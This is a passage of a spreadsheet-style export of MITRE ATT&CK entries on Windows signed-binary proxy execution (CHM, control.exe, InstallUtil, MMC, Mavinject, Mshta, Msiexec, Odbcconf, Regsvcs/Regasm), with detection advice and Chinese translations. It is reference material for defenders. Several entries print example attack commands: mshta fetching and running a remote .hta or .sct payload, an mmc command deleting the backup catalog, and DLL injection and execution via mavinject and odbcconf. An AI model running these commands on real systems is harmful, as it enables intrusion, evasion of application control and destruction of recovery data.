签名的合法二进制文件. CMSTP.exe 还可以被滥用来[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)，并通过自动提升的 COM 接口执行来自恶意 INF 的任意命令。 （引用：MSitPros CMSTP 2017 年 8 月）（引用：GitHub Ultimate AppLocker 绕过列表）（引用：Endurant CMSTP 2018 年 7 月）
T1218.001,System Binary Proxy Execution: Compiled HTML File,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",https://attack.mitre.org/techniques/T1218/001,23 January 2020,11 March 2022,2.0,Defense Evasion,"Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.

Monitor presence and use of CHM files, especially if they are not typically used within an environment.",Windows,"Command: Command Execution, File: File Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International",User,,,,,,"(Citation: SecureList Silence Nov 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: Group IB Silence Aug 2019),(Citation: Group IB Silence Sept 2018),(Citation: Kaspersky Lazarus Under The Hood APR 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Lookout Dark Caracal Jan 2018),(Citation: FireEye APT41 Aug 2019),(Citation: Cyber Forensicator Silence Jan 2019),",系统二进制代理执行/利用已签名的二进制文件代理执行：编译的 HTML 文件,攻击者可能会滥用编译的 HTML 文件 (.chm) 来隐藏恶意代码。 CHM 文件通常作为 Microsoft HTML 帮助系统的一部分分发。 CHM 文件是各种内容的压缩编译，例如 HTML 文档、图像和脚本/Web 相关的编程语言，例如 VBA、JScript、Java 和 ActiveX。 （引文：Microsoft HTML 帮助 2018 年 5 月）使用由 HTML 帮助可执行程序 (hh.exe) 加载的 Internet Explorer 浏览器（引文：Microsoft HTML 帮助 ActiveX）的底层组件显示 CHM 内容。 （引用：Microsoft HTML Help Executable Program）可以将包含嵌入式负载的自定义 CHM 文件传递给受害者，然后由 [User Execution] (https://attack.mitre.org/techniques/T1204) 触发。 CHM 执行还可以绕过较旧和/或未打补丁的系统上的应用程序控制，这些系统不考虑通过 hh.exe 执行二进制文件。 （引用：MsitPros CHM 2017 年 8 月）（引用：Microsoft CVE-2017-8625 2017 年 8 月）
T1218.002,System Binary Proxy Execution: Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)

Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)",https://attack.mitre.org/techniques/T1218/002,23 January 2020,11 March 2022,2.0,Defense Evasion,"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL</code> and <code>ControlRunDLLAsUser</code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1218/011) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1218/011) command, which may bypass detections and/or execution filters for control.exe.(Citation: TrendMicro CPL Malware Jan 2014)

Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:

* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code> and <code>HKEY_CLASSES_ROOT\CLSID\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)
* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>CPLs</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(""c:\windows\system32\control.exe {Canonical_Name}"", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>).(Citation: Microsoft Implementing CPL)
* Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers</code> where {name} is the predefined name of the system item.(Citation: Microsoft Implementing CPL)

Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.(Citation: TrendMicro CPL Malware Jan 2014)",Windows,"Command: Command Execution, File: File Creation, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1218,Application control,ESET,"Administrator, SYSTEM, User",,,,,,"(Citation: Palo Alto Reaver Nov 2017),(Citation: ESET InvisiMole June 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP),(Citation: Beechey 2010),(Citation: Windows Commands JPCERT),(Citation: Corio 2008)",系统二进制代理执行/利用已签名的二进制文件代理执行：控制面板,攻击者可能会滥用 control.exe 来代理恶意负载的执行。 Windows 控制面板进程二进制文件 (control.exe) 处理控制面板项目的执行，这些项目是允许用户查看和调整计算机设置的实用程序。控制面板项是已注册的可执行文件 (.exe) 或控制面板 (.cpl) 文件，后者实际上是重命名的动态链接库 (.dll) 文件，可导出 <code>CPlApplet</code> 函数。（引用：Microsoft实施 CPL）（引用：TrendMicro CPL 恶意软件 2014 年 1 月）为了便于使用，控制面板项目通常包括在注册并加载到控制面板后可供用户使用的图形菜单。（引用：Microsoft 实施 CPL）控制面板项目可以执行直接从命令行，以编程方式通过应用程序编程接口 (API) 调用，或只需双击文件。（引文：Microsoft 实施 CPL）（引文：TrendMicro CPL Malware Jan 2014）（引文：TrendMicro CPL Malware Dec 2013 ) 恶意控制面板项目可以通过 [网络钓鱼](https://attack.mitre.org/techniques/T1566) 活动（引用：TrendMicro CPL Malware Jan 2014）（引用：TrendMicro CPL Malware Dec 2013）或作为一部分执行多级e 恶意软件。（引用：Palo Alto Reaver 2017 年 11 月）控制面板项目，特别是 CPL 文件，也可能绕过应用程序和/或文件扩展名允许列表。攻击者还可以使用控制面板文件扩展名 (.cpl) 重命名恶意 DLL 文件 (.dll) 并将它们注册到 <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>。即使这些注册的 DLL 不符合 CPL 文件规范并且不导出 <code>CPlApplet</code> 函数，它们也会在执行控制面板时通过其 <code>DllEntryPoint</code> 加载和执行。未导出 <code>CPlApplet</code> 的 CPL 文件不可直接执行。（引文：ESET InvisiMole 2020 年 6 月）
T1218.004,System Binary Proxy Execution: InstallUtil,"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.

InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)",https://attack.mitre.org/techniques/T1218/004,23 January 2020,11 March 2022,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.,Windows,"Command: Command Execution, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Casey Smith; Travis Smith, Tripwire",User,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Unit 42 WhisperGate January 2022),(Citation: Cybereason Chaes Nov 2020),(Citation: Malwarebytes Saint Bot April 2021),",系统二进制代理执行/利用已签名的二进制文件代理执行：InstallUtil,攻击者可能会使用 InstallUtil 通过受信任的 Windows 实用程序来代理代码的执行。 InstallUtil 是一个命令行实用程序，它允许通过执行 .NET 二进制文件中指定的特定安装程序组件来安装和卸载资源。 （引用：MSDN InstallUtil）InstallUtil 二进制文件也可能由 Microsoft 进行数字签名，并位于 Windows 系统上的 .NET 目录中：<code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe </code> 和 <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>。 InstallUtil 还可以通过使用二进制文件中的属性来绕过应用程序控制，这些属性执行用属性 <code>[System.ComponentModel.RunInstaller(true)]</code> 修饰的类。 （引用：LOLBAS Installutil）
T1218.014,System Binary Proxy Execution: MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)

For example, <code>mmc C:\Users\foo\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. 

Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)

Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\path\to\test.msc</code>.(Citation: abusing_com_reg)",https://attack.mitre.org/techniques/T1218/014,28 September 2021,20 May 2022,2.0,Defense Evasion,"Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. 

Monitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as <code>services.msc</code> or <code>eventvwr.msc</code>. Invoking non-Microsoft .msc files may be an indicator of malicious activity. ",Windows,"Command: Command Execution, File: File Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation",Wes Hurd,,,,,,,",",系统二进制代理执行/利用已签名的二进制文件代理执行：MMC,攻击者可能会滥用 mmc.exe 来代理执行恶意 .msc 文件。 Microsoft 管理控制台 (MMC) 是一个可由 Microsoft 签名的二进制文件，可在其 GUI 或命令提示符中以多种方式使用。(Citation: win_mmc)(Citation: what_is_mmc) MMC 可用于创建、打开、并保存包含由 Microsoft 创建的管理工具（称为管理单元）的自定义控制台。这些管理单元可用于本地或远程管理 Windows 系统。 MMC 也可用于打开 Microsoft 创建的 .msc 文件以管理系统配置。（引用：win_msc_files_overview）例如，<code>mmc C:\Users\foo\admintools.msc /a</code> 将打开一个自定义，以作者模式保存控制台 msc 文件。（引用：win_mmc）另一个常见示例是 <code>mmc gpedit.msc</code>，它将打开组策略编辑器应用程序窗口。攻击者可能会使用 MMC 命令来执行恶意任务。例如<code>mmc wbadmin.msc delete catalog -quiet</code> 不提示删除系统上的备份目录（即【禁止系统恢复】(https://attack.mitre.org/techniques/T1490)）给用户（注意：<code>wbadmin.msc</code> 可能仅在默认情况下出现在 Windows Server 操作系统上）。（引用：win_wbadmin_delete_catalog）（引用：phobos_virustotal）攻击者也可能滥用 MMC 执行恶意 .msc 文件.例如，攻击者可能首先创建一个恶意注册表类标识符 (CLSID) 子项，该子项唯一地标识一个 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) 类对象。（引用：win_clsid_key ) 然后，攻击者可以使用链接到恶意 CLSID 子键的“链接到 Web 地址”管理单元创建自定义控制台。（引用：mmc_vulns）一旦保存 .msc 文件，攻击者可能会使用以下命令：<code>mmc.exe -Embedding C:\path\to\test.msc</code>。（引用：abusing_com_reg）
T1218.013,System Binary Proxy Execution: Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)

Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. 

In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",https://attack.mitre.org/techniques/T1218/013,22 September 2021,19 April 2022,2.0,Defense Evasion,"Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity.

Adversaries may rename abusable binaries to evade detections, but the argument <code>INJECTRUNNING</code> is required for mavinject.exe to perform [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001) and may therefore be monitored to alert malicious activity.",Windows,"Command: Command Execution, Process: Process Creation",True,T1218,,,,,,,,,",",系统二进制代理执行/利用已签名的二进制文件代理执行：Mavinject,攻击者可能会滥用 mavinject.exe 来代理恶意代码的执行。 Mavinject.exe 是 Microsoft Application Virtualization Injector，一个 Windows 实用程序，可以将代码注入外部进程，作为 Microsoft Application Virtualization (App-V) 的一部分。（引用：LOLBAS Mavinject）攻击者可能滥用 mavinject.exe 将恶意 DLL 注入运行进程（即[动态链接库注入](https://attack.mitre.org/techniques/T1055/001)），允许执行任意代码（例如 <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>）。（引用：ATT Lazarus TTP Evolution）（引用：Reaqta Mavinject）由于 mavinject.exe 可能由 Microsoft 进行数字签名，因此通过此方法代理执行可能会逃避安全产品的检测，因为执行是在合法进程下被掩盖。除了【动态链接库注入】(https://attack.mitre.org/techniques/T1055/001)，Mavinject.exe还可以通过其<code>/HMODULE</code被滥用来执行导入描述符注入> 命令行参数（例如 <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>）。此命令会将包含指定 DLL 的导入表条目注入到给定基地址的模块中。（引用：Mavinject 功能解构）
T1218.005,System Binary Proxy Execution: Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",https://attack.mitre.org/techniques/T1218/005,23 January 2020,11 March 2022,2.0,Defense Evasion,"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.

Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",Windows,"Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","@ionstorm; Ricardo Dias; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",User,,,,,,"(Citation: fsecure NanHaiShu July 2016),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: EST Kimsuky April 2019),(Citation: Lazarus APT January 2022),(Citation: Qualys LolZarus),(Citation: Securelist MuddyWater Oct 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: CISA AA20-301A Kimsuky),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye FIN7 April 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: Github Koadic),(Citation: FireEye Metamorfo Apr 2018),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: KISA Operation Muzabi),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Unit 42 TA551 Jan 2021),(Citation: Unit42 Xbash Sept 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: ESET T3 Threat Report 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cylance Dust Storm),(Citation: DFIR Conti Bazar Nov 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Microsoft WDAC)",系统二进制代理执行/利用已签名的二进制文件代理执行：Mshta,"攻击者可能会滥用 mshta.exe 通过受信任的 Windows 实用程序代理执行恶意 .hta 文件和 Javascript 或 VBScript。有几个不同类型的威胁在初始入侵期间利用 mshta.exe 和执行代码的示例（引用：Cylance Dust Storm）（引用：Red Canary HTA Abuse Part Deux）（引用：利用 HTA 的 FireEye 攻击）（引用：空中客车Security Kovter Analysis）（引用：FireEye FIN7 April 2017）Mshta.exe 是一个执行 Microsoft HTML 应用程序 (HTA) 文件的实用程序。 （引用：Wikipedia HTML 应用程序）HTA 是独立的应用程序，它们使用与 Internet Explorer 相同的模型和技术执行，但在浏览器之外。 （引用：MSDN HTML 应用程序）文件可以由 mshta.exe 通过内联脚本执行： <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct """")""))</code> 它们也可以直接从 URL 执行：<code>mshta http[:]//webserver/payload[.]hta</code> Mshta.exe 可用于绕过应用程序控制不考虑其潜在用途的解决方案。由于 mshta.exe 在 Internet Explorer 的安全上下文之外执行，它也会绕过浏览器安全设置。 （引用：LOLBAS Mshta）"
T1218.007,System Binary Proxy Execution: Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",https://attack.mitre.org/techniques/T1218/007,24 January 2020,19 April 2022,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.,Windows,"Command: Command Execution, Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Alexandros Pappas; Ziv Kaspersky, Cymptom",,,,,,,"(Citation: Rancor Unit42 June 2018),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Cybereason Clop Dec 2020),(Citation: Sophos Ragnar May 2020),(Citation: Profero APT27 December 2020),(Citation: ESET LoudMiner June 2019),(Citation: 360 Machete Sep 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Sophos Maze VM September 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: Korean FSI TA505 2020),(Citation: Juniper IcedID June 2020),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Kaspersky Duqu 2.0),(Citation: Crowdstrike Qakbot October 2020),(Citation: Trend Micro TA505 June 2019),(Citation: Cybereason TA505 April 2019),(Citation: Microsoft AlwaysInstallElevated 2018)",系统二进制代理执行/利用已签名的二进制文件代理执行：Msiexec,攻击者可能会滥用 msiexec.exe 来代理恶意负载的执行。 Msiexec.exe 是 Windows Installer 的命令行实用程序，因此通常与执行安装包 (.msi) 相关联。（引用：Microsoft msiexec） Msiexec.exe 二进制文件也可能由 Microsoft 进行数字签名。攻击者可能会滥用 msiexec.exe 来启动本地或网络可访问的 MSI 文件。 Msiexec.exe 还可以执行 DLL。（引文：LOLBAS Msiexec）（引文：TrendMicro Msiexec 2018 年 2 月）由于它可能在 Windows 系统上进行签名和原生，因此 msiexec.exe 可用于绕过不考虑其的应用程序控制解决方案潜在的滥用。如果启用了 <code>AlwaysInstallElevated</code> 策略，则 Msiexec.exe 执行也可能被提升到 SYSTEM 权限。（引用：Microsoft AlwaysInstallElevated 2018）
T1218.008,System Binary Proxy Execution: Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.

Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) 
",https://attack.mitre.org/techniques/T1218/008,24 January 2020,11 March 2022,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.,Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation",,User,,,,,,"(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Cybereason Bumblebee August 2022),",系统二进制代理执行/利用已签名的二进制文件代理执行：Odbcconf,"攻击者可能会滥用 odbcconf.exe 来代理恶意负载的执行。 Odbcconf.exe 是一个 Windows 实用程序，允许您配置开放式数据库连接 (ODBC) 驱动程序和数据源名称。（引用：Microsoft odbcconf.exe） Odbcconf.exe 二进制文件可能由 Microsoft 进行数字签名。攻击者可能会滥用 odbcconf.exe 绕过不考虑其潜在滥用的应用程序控制解决方案。与 [Regsvr32](https://attack.mitre.org/techniques/T1218/010) 类似，odbcconf.exe 有一个 <code>REGSVR</code> 标志，可能会被误用于执行 DLL（例如：<code> odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>)。 （引用：LOLBAS Odbcconf）（引用：TrendMicro Squiblydoo 2017 年 8 月）（引用：TrendMicro Cobalt Group 2017 年 11 月）"
T1218.009,System Binary Proxy Execution: Regsvcs/Regasm,"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)",https://attack.mitre.org/techniques/T1218/009,23 January 2020,11 March 2022,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.,Windows,"Command: Command Execution, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation",Casey Smith,"Administrator, User",,,,,,"(Citation: SentinelLabs Agent Tesla Aug 2020),",系统二进制代理执行/利用已签名的二进制文件代理执行：Regsvcs/Regasm,攻击者可能会滥用 Regsvcs 和 Regasm 通过受信任的 Windows 实用程序来代理代码执行。 Regsvcs 和 Regasm 是 Windows 命令行实用程序，用于注册 .NET [组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 程序集。两者都是可以由 Microsoft 进行数字签名的二进制文件。 （引用：MSDN Regsvcs）（引用：MSDN Regasm）这两个实用程序都可用于绕过应用程序控制，方法是使用二进制文件中的属性来指定应在注册或注销之前运行的代码：<code>[ComRegisterFunction]</code>或 <code>[ComUnregisterFunction]</code> 分别。具有注册和取消注册属性的代码，即使进程在权限不足的情况下运行而无法执行，也会被执行。 （引文：LOLBAS Regsvcs）（引文：LOLBAS Regasm）
T1218.010,System Binary Proxy Execution: Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)

